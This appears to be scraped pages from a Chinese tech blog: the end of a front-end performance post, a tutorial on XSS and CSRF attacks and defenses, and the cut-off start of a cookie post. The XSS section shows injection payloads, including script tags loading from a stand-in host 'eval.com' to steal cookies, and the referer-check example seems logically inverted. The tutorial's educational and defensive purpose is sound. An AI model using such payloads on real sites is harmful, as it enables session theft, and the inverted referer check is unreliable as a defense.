<h3 id="触发页面重绘的属性"><a href="#触发页面重绘的属性" class="headerlink" title="触发页面重绘的属性"></a>触发页面重绘的属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">color				border-style</span><br><span class="line">border-radius		visibility</span><br><span class="line">text-decoration		background</span><br><span class="line">background-image	background-position</span><br><span class="line">background-repeat	background-size</span><br><span class="line">outline-color		outline</span><br><span class="line">outline-style		outline-width</span><br><span class="line">box-shadow</span><br></pre></td></tr></table></figure>
<h3 id="新建DOM过程"><a href="#新建DOM过程" class="headerlink" title="新建DOM过程"></a>新建DOM过程</h3><p>1、 获取DOM后分割为多个图层<br>2、 对每个图层的阶段计算样式结果(recalulate style — 样式重计算)<br>3、 为每个节点生成图形和位置(Layout— 回流和重布局)<br>4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint — 重绘)<br>5、 图层作为纹理上传至gpu<br>6、 符合多个图层到页面上生成最终屏幕图像(composite layers — 图层重组)</p>
<h3 id="减少重绘和回流"><a href="#减少重绘和回流" class="headerlink" title="减少重绘和回流"></a>减少重绘和回流</h3><p>避免重绘回流的css<br>将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层</p>
<h3 id="如何将DOM创建一个新的图层"><a href="#如何将DOM创建一个新的图层" class="headerlink" title="如何将DOM创建一个新的图层"></a>如何将DOM创建一个新的图层</h3><p>1、3D或者透视变化CSS属性(perspective transform)<br>2、 使用加速视屏解码的 video 节点<br>3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点<br>4、混合插件(如flash)<br>5、对自己的opacity做css动画或使用一个动画webkit变换的元素<br>6、使用加速CSS过滤器的元素(translate3D..)<br>7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)<br>8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)</p>
<h3 id="避免重绘回流"><a href="#避免重绘回流" class="headerlink" title="避免重绘回流"></a>避免重绘回流</h3><p>1、用translate替代top：top会触发回流而translate不会<br>2、用opacity替代visibility：visibility会触发重绘而opacity不会<br>3、不要一条条修改DOM修改样式，可以放在一个class内，替换class<br>4、离线修改，使用display-none修改元素再显示<br>5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）<br>6、不使用table布局，可能很小的修改导致整个table重新布局<br>7、动画实现的速度的选择<br>8、对于动画新建图层 (git图加上will-change, transform)<br>9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))</p>
<h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><ul>
<li>HTML5设计出来专门用于浏览器存储的</li>
<li>大小为5M左右</li>
<li>尽在客户端使用，不和服务端通信</li>
<li>接口封装比较好</li>
<li>浏览器本地缓存方案</li>
</ul>
<h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><ul>
<li>会话级别的浏览器存储</li>
<li>大小为5M左右</li>
<li>仅在客户端使用，不和服务器端通信</li>
<li>接口封装较好</li>
<li>对于表单信息的维护</li>
</ul>
<h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><ul>
<li>IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。</li>
<li>为应用创建离线版本</li>
</ul>
<h2 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h2><p>Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。</p>
<p>PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。</p>
<p>PWA 的主要特点包括下面三点：</p>
<p>可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现<br>体验 - 快速响应，并且有平滑的动画响应用户的操作<br>粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面<br>PWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。</p>
<h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><p>1、使用拦截和处理网络请求能力，实现离线应用<br>2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理</p>
<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="httpheader"><a href="#httpheader" class="headerlink" title="httpheader"></a>httpheader</h3><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><ul>
<li>max-age=”seconds”<br>设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。</li>
<li>s-maxage=”seconds”<br>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</li>
<li>public<br>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</li>
<li>private<br>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。</li>
<li>no-cache<br>在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。</li>
<li>no-store<br>缓存不应存储有关客户端请求或服务器响应的任何内容。<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4></li>
<li>缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点</li>
<li>告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求<h4 id="Last-Modified-If-Modified-Since"><a href="#Last-Modified-If-Modified-Since" class="headerlink" title="Last-Modified/If-Modified-Since"></a>Last-Modified/If-Modified-Since</h4><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5>The Last-Modified  是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致<br>1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since<br>2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5>1、某些服务器不能获取精确的修改时间<br>2、文件修改时间改了，但文件内容却没有改变<h4 id="Etag-If-None-Match"><a href="#Etag-If-None-Match" class="headerlink" title="Etag/If-None-Match"></a>Etag/If-None-Match</h4></li>
<li>文件内容的hash值</li>
<li>etag——response header</li>
<li>if-none-match —— request header</li>
<li>需要和cache-control一起使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------    </span><br><span class="line">					   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新</span><br><span class="line">\       200状态        /   浏览器直接去服务器下载最新数据</span><br><span class="line"></span><br><span class="line">  -------------------     </span><br><span class="line">					   这一层由 last-modified / Etag 控制,当下一层失效时，</span><br><span class="line">  \     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变</span><br><span class="line">					   化则返回304</span><br><span class="line">    ----------------      </span><br><span class="line">				       这层由expires/cache-control控制，expires(http 1.0     </span><br><span class="line">    \ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对</span><br><span class="line">					   时间，两者都存在，cache-control覆盖expires，没有失效</span><br><span class="line">      --------------      则直接访问自己缓存</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/前端/font-end-optimize/./font-end-cache.png" alt="Alt text"></p>
<h2 id="服务端性能优化"><a href="#服务端性能优化" class="headerlink" title="服务端性能优化"></a>服务端性能优化</h2><h3 id="多层次优化方案"><a href="#多层次优化方案" class="headerlink" title="多层次优化方案"></a>多层次优化方案</h3><ul>
<li>构建层模版编译</li>
<li>数据无关prerender方式</li>
<li>服务端渲染</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/HTTP/what-is-xss-csrf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/HTTP/what-is-xss-csrf/" itemprop="url">啥是XSS和CSRF?</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-18T18:18:49+08:00">
                2019-04-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。</p>
<h1 id="啥是XSS？"><a href="#啥是XSS？" class="headerlink" title="啥是XSS？"></a>啥是XSS？</h1><h2 id="XSS-Cross-site-scripting-介绍"><a href="#XSS-Cross-site-scripting-介绍" class="headerlink" title="XSS(Cross-site scripting)介绍"></a>XSS(Cross-site scripting)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对XSS的介绍</p>
<blockquote>
<p>Wikipedia:</p>
<p><strong>跨网站指令码</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。</p>
<p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p>
<p>MDN:</p>
<p>跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者</p>
</blockquote>
<p><strong>划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限</strong></p>
<p><strong>总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取</strong></p>
<h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>被攻击的通常分为两种类型：<strong>存储型XSS、反射型XSS</strong></p>
<h3 id="存储型XSS原理"><a href="#存储型XSS原理" class="headerlink" title="存储型XSS原理"></a>存储型XSS原理</h3><blockquote>
<p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p>
</blockquote>
<p>下面看一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// html 评论</span><br><span class="line">&lt;input name=&quot;comment&quot; id=&quot;comment&quot; value=&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// db</span><br><span class="line">insert into table value(&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;)</span><br><span class="line"></span><br><span class="line">// 步骤</span><br><span class="line">1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies</span><br><span class="line">2、评论被添加进数据库</span><br><span class="line">3、用户都可以看见评论，并加载一个script</span><br><span class="line">4、恶意script盗取用户信息</span><br></pre></td></tr></table></figure>
<p><strong>总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行</strong></p>
<h3 id="反射型XSS原理"><a href="#反射型XSS原理" class="headerlink" title="反射型XSS原理"></a>反射型XSS原理</h3><blockquote>
<p> 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。</p>
</blockquote>
<p>下面看一个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// url</span><br><span class="line">http://example.com?search=value&apos;&lt;script src=&quot;http://eval.com&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">// html</span><br><span class="line">&lt;input value=window.location.search&gt;</span><br><span class="line"></span><br><span class="line">// 步骤</span><br><span class="line">1、网页内嵌值由参数直接传入</span><br><span class="line">2、恶意攻击者将参数包含script标签，加载恶意脚本</span><br><span class="line">3、恶意脚本在网页中生效，盗取用户信息</span><br></pre></td></tr></table></figure>
<p><strong>总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行</strong></p>
<h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="XSS注入点"><a href="#XSS注入点" class="headerlink" title="XSS注入点"></a>XSS注入点</h3><p>在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本</p>
<h4 id="HTML节点"><a href="#HTML节点" class="headerlink" title="HTML节点"></a>HTML节点</h4><p>html节点包含用户输入内容，节点内容包含脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// 用户输入，将content内容替换为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;img src=&quot;$&#123;src&#125;&quot;&gt;</span><br><span class="line">// 用户输入，将src替换为 2&quot; onerror=&quot;alert(2)</span><br><span class="line">&lt;img src=&quot;2&quot; onerror=&quot;alert(2)&quot;&gt;</span><br></pre></td></tr></table></figure>
<h4 id="JavaScript代码"><a href="#JavaScript代码" class="headerlink" title="JavaScript代码"></a>JavaScript代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;hello&quot;; alert(3);var a = &quot;&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h4><p>由于富文本需要保留html的原因，因此本身会有xss风险</p>
<h3 id="XSS分析及防御"><a href="#XSS分析及防御" class="headerlink" title="XSS分析及防御"></a>XSS分析及防御</h3><p>了解攻击原理后，防御自然而然的也水到渠成了</p>
<h4 id="浏览器自带防御"><a href="#浏览器自带防御" class="headerlink" title="浏览器自带防御"></a>浏览器自带防御</h4><p>浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性</p>
<p>防御原理是将可能会执行脚本的标签或属性进行转义和过滤。</p>
<h4 id="HTML节点内容及属性防御"><a href="#HTML节点内容及属性防御" class="headerlink" title="HTML节点内容及属性防御"></a>HTML节点内容及属性防御</h4><p>将&lt;和&gt;转译成&amp;lt &amp;gt，将单引号，双引号，&amp;及空格等转译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// 用户输入&lt;script&gt;alert(1)&lt;/script&gt;后进行转译，将&lt;&gt;进行转译&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt</span><br><span class="line">&lt;div&gt;&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h4 id="Javascript代码防御"><a href="#Javascript代码防御" class="headerlink" title="Javascript代码防御"></a>Javascript代码防御</h4><p>使用JSON.stringify</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;,使用JSON.stringify(hello&quot;;alert(3); var a = &quot;)</span><br><span class="line">// 对输入内容会出现转译错误，结束操作</span><br></pre></td></tr></table></figure>
<h4 id="富文本防御"><a href="#富文本防御" class="headerlink" title="富文本防御"></a>富文本防御</h4><p>按照白名单保留部分标签和属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var whiteList = &#123;</span><br><span class="line">    &quot;img&quot;:[&quot;src&quot;],</span><br><span class="line">    &quot;a&quot;:[&quot;href&quot;],</span><br><span class="line">    &quot;font&quot;:[&quot;color&quot;,&quot;size&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">html.forEach(node =&gt; &#123;</span><br><span class="line">    // 过滤白名单</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>最佳方式使用第三方<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a>白名单进行过滤</p>
<h3 id="XSS攻击防御总结："><a href="#XSS攻击防御总结：" class="headerlink" title="XSS攻击防御总结："></a>XSS攻击防御总结：</h3><ul>
<li>XSS是通过加载第三方脚本进行攻击</li>
<li>XSS攻击类型有存储型和反射型</li>
<li>XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本</li>
<li>XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御</li>
</ul>
<h1 id="啥又是CSRF？"><a href="#啥又是CSRF？" class="headerlink" title="啥又是CSRF？"></a>啥又是CSRF？</h1><h2 id="CSRF-Cross-Site-Request-forgery-介绍"><a href="#CSRF-Cross-Site-Request-forgery-介绍" class="headerlink" title="CSRF(Cross Site Request forgery)介绍"></a>CSRF(Cross Site Request forgery)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对CSRF的介绍</p>
<blockquote>
<p>Wikipedia:</p>
<p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p>
<p>MDN:</p>
<p>跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式</p>
</blockquote>
<p><strong>划重点：跨站请求伪造、冒充受信任用户、发送非预期请求</strong></p>
<p><strong>总结：CSRF是通过冒充用户来达到攻击目的的方式</strong></p>
<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   www.a.com后端</span><br><span class="line">	  ||\       |\</span><br><span class="line">   1||2          \  3</span><br><span class="line">   \||             \</span><br><span class="line">www.a.com前端         www.b.com</span><br><span class="line"></span><br><span class="line">1、用户登陆A网站</span><br><span class="line">2、A网站确认身份</span><br><span class="line">3、B网站页面向A网站发起请求（带A网站身份）</span><br></pre></td></tr></table></figure>
<h2 id="CSRF分析及防御"><a href="#CSRF分析及防御" class="headerlink" title="CSRF分析及防御"></a>CSRF分析及防御</h2><h3 id="CSRF原理分析"><a href="#CSRF原理分析" class="headerlink" title="CSRF原理分析"></a>CSRF原理分析</h3><p>B网站向A网站发起攻击原理：</p>
<ul>
<li>B网站向A网站请求</li>
<li>携带A网站Cookie</li>
<li>不访问A网站前端</li>
<li>请求的referer为B网站</li>
</ul>
<h3 id="CSRF防御"><a href="#CSRF防御" class="headerlink" title="CSRF防御"></a>CSRF防御</h3><p>CSRF的核心原理即：1、不直接访问A网站前端，而是通过B访问A，则可以通过<strong>禁止使用第三方带来cookies，增加验证码、token机制</strong>。2、B网站访问A网站，故所携带的referer为B网站。则可以通过<strong>验证referer，禁止来自第三方请求</strong></p>
<h4 id="禁止第三方网站带来cookies"><a href="#禁止第三方网站带来cookies" class="headerlink" title="禁止第三方网站带来cookies"></a>禁止第三方网站带来cookies</h4><p>通过Cookie的SameSite禁止第三方访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; path=/; SameSite</span><br></pre></td></tr></table></figure>
<p>由于SameSite兼容问题，对于大部分版本低的浏览器和部分浏览器不予支持。在使用中需考虑是否由于低版本问题而不生效，但SameSite不会因版本过低而报错，因此可放心使用</p>
<p>详细<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility" target="_blank" rel="noopener">Cookie</a>可点击查看</p>
<h4 id="增加验证码，token"><a href="#增加验证码，token" class="headerlink" title="增加验证码，token"></a>增加验证码，token</h4><p>由于生效机制是B网站访问A网站携带Cookie即获得信任，则可以通过增加必须操作时带入验证码及本地token携带</p>
<h4 id="验证referer，禁止来自第三方的请求"><a href="#验证referer，禁止来自第三方的请求" class="headerlink" title="验证referer，禁止来自第三方的请求"></a>验证referer，禁止来自第三方的请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// koa</span><br><span class="line">let referer = ctx.request.headers.referer</span><br><span class="line">if (/^https?:\/\/example.com/.test(referer)) &#123;</span><br><span class="line">  // error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第三方访问的referer是第三方页面请求的referer，而非本身服务器请求的referer</p>
<p>在判断第三方请求时，可使用正则表达式</p>
<h2 id="CSRF攻击防御总结"><a href="#CSRF攻击防御总结" class="headerlink" title="CSRF攻击防御总结"></a>CSRF攻击防御总结</h2><ul>
<li>CSRF攻击主要是恶意网站访问已经具有登录态的网站</li>
<li>通过携带A网站的Cookie，以用户身份进行业务操作</li>
<li>攻击原理的核心要点是不直接访问登录态网站及referer为攻击者网站</li>
<li>防御核心原理是禁止第三方携带Cookie进行请求、增加验证码、token机制、验证referer及禁止第三方请求</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XSS和CSRF是常见的Web攻防，攻击者通过注入或伪装进行攻击。XSS防御可通过es6模版字符串解决大部分注入问题；CSRF则不使用简单Cookie作为登录态唯一凭证，禁止第三方请求杜绝绝大部分问题。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/HTTP/basic-cookies/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/HTTP/basic-cookies/" itemprop="url">管中窥豹看Cookie</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-09T21:14:04+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文主要介绍了什么是cookie、cookie的特性、cookie的作用及用途、cookie的安全策略。不涉及Cookie的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">详细参数</a>。</p>
<h2 id="Cookie介绍"><a href="#Cookie介绍" class="headerlink" title="Cookie介绍"></a>Cookie介绍</h2><p>以下Wikipedia、MDN对cookie的介绍</p>
<blockquote>
<p><strong>Wikipedia:</strong></p>
<p>Cookie（复数形态Cookies），又称为“小甜饼”。类型为“<strong>小型文本文件</strong>”，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。由网景公司的前雇员卢·蒙特利在1993年3月发明。最初定义于RFC 2109。当前使用最广泛的 Cookie标准却不是RFC中定义的任何一个，而是在网景公司制定的标准上进行扩展后的产物。</p>
<p><strong>MDN:</strong></p>
<p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p>
</blockquote>
<p><strong>划重点：小型文本文件、辨别用户身份存储在用户本地、判断是否来自同一浏览器、保持登录态</strong></p>
<p>Cookie的最初想法是当作小型文本文件，在HTTP请求中作为用户数据作为信息传递。最常规的用法是服务器给客户端一个唯一标识，客户端在与服务器互动时将标识回传给服务器，客户端即可判断用户登录态。</p>
<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./exchange-cookies.png" alt="cookies消息传递">Cookies的传输</div>

<p><strong>注意</strong>：<em>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，cookie渐渐被淘汰。</em></p>
<h2 id="Cookie的特性"><a href="#Cookie的特性" class="headerlink" title="Cookie的特性"></a>Cookie的特性</h2><h3 id="前端数据存储及读写"><a href="#前端数据存储及读写" class="headerlink" title="前端数据存储及读写"></a>前端数据存储及读写</h3><p>Cookie可由前端进行操作，可将数据暂存至cookie中。JavaScript操作cookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie 